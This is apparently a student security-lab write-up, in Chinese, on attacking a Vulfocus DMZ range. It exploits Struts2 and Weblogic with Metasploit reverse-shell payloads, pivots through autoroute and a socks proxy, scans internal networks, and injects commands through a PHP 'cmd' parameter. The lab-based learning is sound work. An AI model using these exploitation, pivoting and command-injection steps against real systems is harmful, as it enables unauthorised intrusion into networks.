# 网安实践实验一

---

## 环境配置：安装docker

通过述一系列命令实现：

```bash
#将软件源信息写入list文件，使 APT 可以从这个源安装 Docker 相关软件
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | \
sudo tee /etc/apt/sources.list.d/docker.list 

#使用 curl 命令下载 Docker 官方的 GPG 公钥，将GPG 公钥从文本格式转换为二进制格式，用以验证 Docker 软件包的签名，确保软件包来源可信
  curl -fsSL https://download.docker.com/linux/debian/gpg |
  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

#安装 Docker 及相关组件
  sudo apt update
  sudo apt install -y docker-ce docker-ce-cli containerd.io
```

成功安装后 docker 的版本信息应该如下所示(2025年3月)：

![](./img/docker版本信息.png)

---

## Vulfocus搭建

如果出现了Vuldocus无法登录的情况，出现以下错误：

![](./img/登录报错.png)

呢么需要进入 vulfocus 的容器，执行下面的命令启动redis服务：

```bash
redis-service
```

![](./img/登录报错解决方法.png)

## DMZ环境搭建

在之前成功运行的Vulfocus的基础上进行操作

### 网卡创建

首先根据下面的步骤依次建立两个网卡,网卡的名称任意，子网和网关不和虚拟机网卡重复即可

![](./img/添加网卡操作.png)

### DMZ场景编排

由于直接导入场景编排的压缩包失败，所以需要手动去编排一个场景，这里可以参考原先的场景编排压缩包中的内容进行操作，对 `DMZ.zip`解压后可以发现，其中包含了去创建一个场景所需的所有信息，包括网卡信息和镜像配置等信息

可以直接通过对 `raw-content.json`这个文件格式化查看，也可以通过 `jq`和 `grep`查找需要的内容。

首先确定需要的镜像有哪些：

```bash
cat raw-content.json | jq . | grep image_name
```

即查看文件中与 `image_name`相关的内容有哪些：

![](./img/dmz安装镜像.png)

可知需要安装是三个不同的镜像文件：

```
vulshare/nginx-php-flag:latest
vulfocus/struts2-cve_2020_17530:latest
vulfocus/weblogic-cve_2019_2725:latest
```

其中第一个镜像存在运行问题，需要替换为:

```
c4pr1c3/vulshare_nginx-php-flag
```

这里有两种安装的方法：

* 第一种是通过 Vulfocus 的 GUI 界面安装，它会直接调用 `docker pull`拉取镜像
* 第二种事直接手动在命令行执行 `docker pull`拉取镜像，然后再通过 Vulfocus 的 GUI 界面将本地镜像添加进取

完成镜像拉取后，可以在下面的页面进行编排，详情如下：

![](./img/dmz场景编排.png)

完成场景编排后发布场景并在场景模块中启动场景

![](./img/DMZ启动场景.png)

### 流量捕获配置

在启动了场景之后，可以通过下面的命令开启对 `struts2-cve_2020_17530`的流量捕获

```bash
container_name="<替换为目标容器名称或ID>"
docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
```

该命令在当前路径下创建了一个 `tcpdump`目录，并且将对指定容器监控的流量捕获到目录中

## DMZ 入口靶标

入口靶标页面如下，记录目标 ip 和端口号

![](./img/入口靶标.png)

进入攻击机，更新并初始化 `metasploit`

```bash
sudo apt install -y metasploit-framework
sudo msfdb init
```

检查数据库连接情况并创建工作区准备攻击：

```bash
db_status
workspace - a vulfoucus
```

![](./img/检查状态与创建工作目录.png)

由于已经知道了漏洞为 `struts2代码执行漏洞`，所以进行相关搜索搜索：

```bash
search struts2 type:exploit
search S2-059 type:exploit
```

使用 `info`可以指定序号或名称查看详情

```bash
info 0
```

使用 `use`可以使用指定的exp

```bash
use 0
```

使用 `show options`可以查看exp的详细参数配置,使用 `show payloads`可以查看可用 exp payloads：

```bash
show options
show payloads
```

![](./img/查看payload.png)

选择一个需要的 `payload`使用并根据参数列表的内容修改靶机和攻击机的参数

```bash
set payload payload/cmd/unix/reverse_bash   #设置payload
set RHOSTS 192.168.131.10   #靶机IP
set rport  30947    #靶机目标端口  
set LHOST  192.168.131.6   #攻击者主机IP 
```

检查配置的参数,发现已经得到修改：

![](./img/检查参数设置.png)

执行攻击，如果攻击成功，按照 payload 的内容可以获得靶机的 shell:

```bash
run -j 
```

![](./img/靶口获得shell.png)

使用 `sessions`命令查看列表，打开 `shell`执行命令

```bash
sessions -l
sessions -i 2
```

![](./img/攻破靶口.png)

得到flag

## 建立立足点发现靶标2、3、4

`ctrl-z`将 session 放入后台

对要攻击的目标进行扫描：

```bash
db_nmap -p 60990,80,22 192.168.131.10 -A -T4 -n
```

![](./img/端口扫描.png)

可以看出在扫描前 `hosts`的内容只有一个之前指定的 ip 地址，扫描的结果显示发现了 22,80,60990 均为开放端口

扫描过后再次查看 `hosts`和 `services`情况

![](./img/内容更新.png)

发现 `hosts`中的内容得到了补全，并且 `services`中的内容得到了扩充

![](./img/)

升级 shell 为 Meterpreter Shell

![](./img/升级shell.png)

进入升级后的 shell 并查看当前网络的情况：

![](./img/查看网卡.png)

![](./img/查看route和arp.png)

发现入口靶机的内部地址为 `192.170.84.3`并且发现有一个新的网段 `192.170.84.0/24`

接下来需要使用到**autoroute**

> MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是MSF框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用MSF去访问原本不能直接访问的内网资源.

执行下面的命令建立新的路由并查看建立的结果：

```bash
run autoroute -s 192.170.84.0/24
run autoroute -p
```

![](./img/autoroute.png)

退出当前的 session 准备端口扫描：

首先搜索需要的模块，然后选择需要使用的模块

```bash
search portscan
use auxiliary/scanner/portscan/tcp
```

![](./img/内网端口扫描工具.png)

和前面一样，查看需要的参数并进行配置：

![](./img/内网端口扫描参数配置.png)

```bash
set RHOSTS 192.170.84.2-254 #根据之前的内网网关ip为192.170.84.1推断其他的ip一定是介于2到254
set rport 7001 #为了加快扫描速度指定扫描端口为7001，这里也可以不指定，但会慢很多
set threads 10 #多线程加快扫描速度
```

使用 `exploit`启动扫描:

![](./img/内网扫描到新ip.png)

新扫描到的 ip 被同步到了 `hosts`与 `services`表中：

![](./img/内网新的ip已同步到hosts.png)

然后搜索并使用另外一个 socks_proxy 模块,参数不用做修改

![](./img/socks.png)

直接启动:

![](./img/启动socks_proxy.png)

然后在攻击机中另开一个 shell:
先检查下 1080 端口服务开放情况：

```bash
sudo lsof -i tcp:1080 -l -n -P
```

![](./img/检查1080.png)

确定端口开放正常后，对下面的配置文件进行编辑，在其最后修改 socks 代理为 `socks5 127.0.0.1 1080 `

```bash
sudo vim /etc/proxychains4.conf
```

![](./img/修改socks5代理.png)

然后执行下面的命令对内网进行扫描：

```bash
proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.170.84.2-5
```

![](./img/内网nmap7001扫描.png)

可以看到扫描到的结果均为 filter (过滤)

下面需要去验证这些断后是否针对能连通：
进入入口机的 shell 当中，执行下面的 `curl`命令获取指定的内网网页内容：

```bash
curl http://192.170.84.2:7001 -vv
curl http://192.170.84.4:7001 -vv
curl http://192.170.84.5:7001 -vv
```

![](./img/curl指定内网网页1.png)

返回的结果都为 404，说明网络层是连通的，只是该网页没有内容罢了

## 攻击内网第一层靶标

确认内网第一层靶标的目标后，和之前对入口靶标攻击一样，这里由于已经知道了具体的漏洞类型，所以可以直接搜索具体的类型进行攻击：

![](./img/靶标1.png)

修改其中的参数，将 `RHOSTS` 与 `LHOST` 进行修改,使用的payload还和入口靶标一样，是`reverse_bash`（反弹shell），不需要修改

![](./img/靶标第一层参数.png)


攻破第一层靶标1

![](./img/靶标1攻破.png)

剩余的两个靶标用同样的方式获得 shell 攻破，在第一个靶标的基础上仅替换其中的目标地址 `RHOSTS` 即可：

攻破第一层靶标2

![](./img/靶标2攻破.png)

攻破第一层靶标3

![](./img/靶标3攻破.png)

最后总结获得的四个靶标shell如下：

![](./img/第一层总结.png)

## 攻击内网第二层靶标

执行下面的命令对之前已经获得的三个第一层靶标shell测试，找出拥有双网卡的那个靶机：
```bash
sessions -c "ifconfig" -i 4,5,6
```

![](./img/双网卡靶标确认.png)

确认是 session id 为 5 的那个靶机

将这个靶机升级后进入其中：

![](./img/升级第二层靶标入口.png)

确定第二层靶标的网段：`192.169.85.0/24`

![](./img/第二层靶标网段.png)



现在暂时切回攻击机，和之前对第一层靶标进行的操作一样，在攻击机中对第二层靶标的入口进行扫描：
```bash
proxychains sudo nmap -vv -n -p 80 -Pn -sT 192.169.85.3
```

![](./img/第二层靶标入口同样被过滤.png)

结果和第一层的一样，也被过滤了

对这个网段的其他 ip 扫描：
```bash
proxychains sudo nmap -vv -n -p 80 -Pn -sT 192.169.85.2-254 | grep open
``` 

![](./img/第二层靶标全被过滤.png)

结果显示全被过滤，所以使用`nmap`扫描得不出具体的第二层目标地址,尝试另一种方法:
回到之前升级的第一层靶机的 shell 中，发现`wget`这个命令可用，于是可以通过`wget`,去尝试获取网页的内容，如果获取某一个 ip 的网页成功，说明这个 ip 有开放的端口，就可能有能攻击的地方

于是进行尝试：

```bash
wget http://192.169.85.2
wget http://192.169.85.3
wget http://192.169.85.4
wget http://192.169.85.5
wget http://192.169.85.6
……
```

发现在 ip 为`192.169.85.2`时获取成功，后面的几个都失败了，于是可以确定该 ip 为第二层的靶标 ip

但是这里仅仅只是确认了这个 ip 存在，还没有获取到网页的内容，于是使用 `wget` 将网页信息保存到文件中，并在命令行使用 `cat` 命令打印出文件内容，依次构建下面的两个命令：

```bash
wget http://192.169.85.2
wget http://192.169.85.2 -O /tmp/result && cat /tmp/result
```

![](./img/攻破第二层靶关键.png)

根据回显的内容可以知道，该页面是一个`php`文件，并且有一个变量`cmd`可供传参，而且可以猜测传入的参数会得到执行

于是可以在上面构建的命令的基础上构建下面的最终命令：

```bash
wget http://192.169.85.2/index.php?cmd="ls /tmp" -O /tmp/result && cat /tmp/result
```

即在请求网页时将参数传入，并将网页的回显内容打印出来，得到 flag

![](./img/攻破第二层靶.png)

至此，DMZ 的所有靶标都被攻破

![](./img/DMZ完成.png)

参考资料：

[网络安全(2023) 综合实验_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1p3411x7da/?vd_source=6c62cb1cac14ec9c6d9e57e7ba2e13c9)

[利用msf自带的route模块穿透目标内网 - Guko&#39;s Blog](https://pingmaoer.github.io/2020/05/09/%E5%88%A9%E7%94%A8msf%E8%87%AA%E5%B8%A6%E7%9A%84route%E6%A8%A1%E5%9D%97%E7%A9%BF%E9%80%8F%E7%9B%AE%E6%A0%87%E5%86%85%E7%BD%91/)
